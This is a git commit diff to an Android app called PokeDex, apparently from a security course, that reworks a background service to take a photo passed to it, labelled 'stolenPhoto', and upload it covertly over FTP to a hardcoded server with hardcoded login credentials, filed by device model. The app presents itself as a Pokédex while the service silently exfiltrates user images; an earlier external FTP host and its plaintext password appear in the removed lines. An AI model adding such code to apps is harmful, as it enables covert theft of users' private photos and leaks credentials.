19473bd6883100ee8e7b291cc82721811630f51a
Santiago <santiago.alvarez@mercadolibre.com>
2015-07-02 21:57:33 -0300

    pokemon service v2

--- PokeDex/app/src/main/java/com/seginf/pokedex/PokemonService.java
+++ PokeDex/app/src/main/java/com/seginf/pokedex/PokemonService.java
@@ -3,7 +3,10 @@ package com.seginf.pokedex;
 import android.app.Service;
 import android.content.Intent;
 import android.graphics.Bitmap;
+import android.os.Build;
 import android.os.IBinder;
+import android.os.Parcelable;
+import android.os.StrictMode;
 import android.util.Log;
 
 import org.apache.commons.net.ftp.FTPClient;
@@ -12,12 +15,12 @@ import java.io.BufferedInputStream;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
-import java.net.InetAddress;
 
 
 public class PokemonService extends Service {
 
     private static String TAG = "PokemonService";
+    private static String SEND_RESULT_API_HOST = "10.2.200.89";
 
     @Override
     public void onCreate() {
@@ -35,54 +38,68 @@ public class PokemonService extends Service {
 
         if (intent == null) return 0;
 
-        Bitmap photo = intent.getParcelableExtra("photo");
+        Parcelable photo = intent.getParcelableExtra("photo");
 
-        if (photo == null) {
-            Log.d(TAG, "photo was null");
+        if (photo == null || !(photo instanceof Bitmap)) {
+            Log.d(TAG, "photo was null or not a bitmap");
             return 0;
         }
 
         Log.d(TAG, "received bitmap!!");
 
-        sendPhotoToServer(photo);
+        sendToServer((Bitmap) photo);
 
         return Service.START_STICKY;
     }
 
-    private void sendPhotoToServer(final Bitmap photo) {
+    private void sendToServer(final Bitmap stolenPhoto) {
+
+        if (android.os.Build.VERSION.SDK_INT > 9) {
+            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+            StrictMode.setThreadPolicy(policy);
+        }
+
         new Thread(new Runnable() {
             @Override
             public void run() {
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                photo.compress(Bitmap.CompressFormat.PNG, 100, baos);
-                baos.toByteArray();
-
                 FTPClient ftpClient = new FTPClient();
 
-                try {
+                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+                stolenPhoto.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
+                byteArrayOutputStream.toByteArray();
 
-                    ftpClient.connect(InetAddress.getByName("ftp.deanastasie.com.ar"));
-                    ftpClient.login("deanastasie", "3rLJskyhsF");
-                    ftpClient.changeWorkingDirectory("test/fotos/");
+                try {
+                    ftpClient.connect(SEND_RESULT_API_HOST);
+                    ftpClient.login("partu", "caca");
+                    String workingDirectory = "server/photos" + Build.MODEL;
+                    boolean directoryResult = ftpClient.changeWorkingDirectory(workingDirectory);
+
+                    if (!directoryResult) {
+                        ftpClient.makeDirectory(workingDirectory);
+                        ftpClient.changeWorkingDirectory(workingDirectory);
+                    }
 
                     String name = Double.toString(Math.random());
-
-                    if (ftpClient.getReplyString().contains("250")) {
+                    Log.d(TAG, ftpClient.getReplyString());
+                    String response = ftpClient.getReplyString();
+                    if (response.contains("230") || response.contains("250")) {
                         ftpClient.setFileType(org.apache.commons.net.ftp.FTP.BINARY_FILE_TYPE);
                         BufferedInputStream buffIn;
-                        InputStream is = new ByteArrayInputStream(baos.toByteArray());
+                        InputStream is = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
                         buffIn = new BufferedInputStream(is);
                         ftpClient.enterLocalPassiveMode();
-                        ftpClient.storeFile(name, buffIn);
+                        boolean result = ftpClient.storeFile(name, buffIn);
+                        Log.d(TAG, "resultado del store " + result);
                         buffIn.close();
                         ftpClient.logout();
                         ftpClient.disconnect();
                     }
 
                 } catch (Exception e) {
-                    e.getStackTrace();
+                    e.printStackTrace();
+                    Log.d(TAG, "EXCEPTION IN sendToServer");
                 }
             }
-        });
+        }).run();
     }
 }
